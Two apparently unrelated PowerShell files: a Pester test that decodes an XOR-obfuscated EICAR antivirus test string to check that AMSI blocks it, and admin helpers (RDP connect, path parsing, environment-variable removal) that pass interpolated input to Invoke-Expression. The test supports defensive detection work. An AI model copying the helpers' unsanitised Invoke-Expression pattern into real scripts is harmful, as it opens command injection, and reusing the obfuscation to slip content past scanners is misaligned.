content:
﻿


try
{
    $defaultParamValues = $PSDefaultParameterValues.Clone()
    $PSDefaultParameterValues["it:Skip"] = !$IsWindows

    Describe "AMSI scan should detect suspicious content" -Tags 'Feature','RequireAdminOnWindows' {

        BeforeAll {
            [System.Management.Automation.Internal.InternalTestHooks]::SetTestHook("UseDebugAmsiImplementation", $true)
        }

        AfterAll {
            [System.Management.Automation.Internal.InternalTestHooks]::SetTestHook("UseDebugAmsiImplementation", $false)
        }

        It "Verifies AMSI scan detects debug suspicious content" {

            $EICAR_STRING_B64 = "awZ8EmMWc3JjaAdvY2lrBgcbY20aBHBwGgROF3Z6cHJhHmBncn13cmF3HnJ9Z3plemFmYB5ndmBnHnV6f3YSF3sYexk= "
            $bytes = [System.Convert]::FromBase64String($EICAR_STRING_B64)
            $EICAR_STRING = -join ($bytes | ForEach-Object { [char]($_ -bxor 0x33) })
            { Invoke-Expression -Command "echo '$EICAR_STRING'" } |
                Should -Throw -ErrorId "ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand"
        }
    }
}
finally
{
    if ($defaultParamValues -ne $null)
    {
        $Global:PSDefaultParameterValues = $defaultParamValues
    }
}

﻿

function Connect-RDP{



	param (
        [parameter(Mandatory=$true)]
        [string[]]$Name
	)




    if ((Get-Command "cmdkey") -and (Get-Command "mstsc")){ 



        $Servers = Get-RemoteConnection -Name $Name

        if(!(Get-ChildItem -Path $PSconfigs.Path -Filter $PStemplates.RDP.Name -Recurse)){

            Write-Host "Copy $($PStemplates.RDP.Name) file to the config folder"        
    		Copy-Item -Path $PStemplates.RDP.FullName -Destination (Join-Path -Path $PSconfigs.Path -ChildPath $PStemplates.RDP.Name)
    	} 
		$RDPDefaultFile = $(Get-ChildItem -Path $PSconfigs.Path -Filter $PStemplates.RDP.Name -Recurse).Fullname		

        foreach($Server in $Servers){

            $Servername = $Server.Name
            $Username = $Server.User


            $Null = Invoke-Expression "cmdkey /delete:'$Servername'"


            $Null = Invoke-Expression "cmdkey /generic:'$Servername' /user:'$Username'"


            Invoke-Expression "mstsc '$RDPDefaultFile' /v:$Servername"
	    }
    }
}

function Get-PathAndFilename{



    [CmdletBinding()]
    param(

		[Parameter( Mandatory=$true)]
		[String]
		$Path
	)


    $Path = [System.Environment]::ExpandEnvironmentVariables($Path)


    if($Path.contains("$")){
        $Path = Invoke-Expression "`"$Path`""
    }


    if($Path.StartsWith("\")){
        $Path = Join-Path -Path $(Get-Location).Path -Childpath $Path
    }


    if(-not $Path.Contains("\")){

        $Filename = $Path
        $Path = $null

    }else{


        $ResolvedPath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($Path)
        $Path = $ResolvedPath + $(if($Path.EndsWith("\") -and -not $ResolvedPath.EndsWith("\")){"\"})


        if($Path.EndsWith("\")){

            $Filename = $null

        }else{

            $Filename = Split-Path $Path -Leaf
            $Path = Split-Path $Path -Parent         
        }
    }

    @{
        Path = $Path
        Filename = $FileName    
    }
}

function Remove-EnvironmentVariableValue{



    [CmdletBinding()]
    param(

		[Parameter(Mandatory=$true)]
		[String]
		$Name,

		[Parameter(Mandatory=$true)]
		[String]
		$Value, 

		[Parameter(Mandatory=$true)]
		[String]
		$Target,  

		[Switch]
		$Clear  
	)  





    [Environment]::GetEnvironmentVariable($Name,$Target) | %{

        if(($_.Contains($Value) -or (Invoke-Expression "`$env:$Name").contains($Value)) -and -not $Clear){

            Write-Host "Remove value: $Value from variable: $Name"            
            $Value = $_.Trim($Value)
            [Environment]::SetEnvironmentVariable($Name, $Value,$Target)
            Invoke-Expression "`$env:$Name = `"$Value`""

        }elseif($Clear){

            Write-Host "Set value from variable: $Name to `$null"
            [Environment]::SetEnvironmentVariable($Name,$null,$Target)    
            Invoke-Expression "`$env:$Name = `$null"        
        }
    }     
}
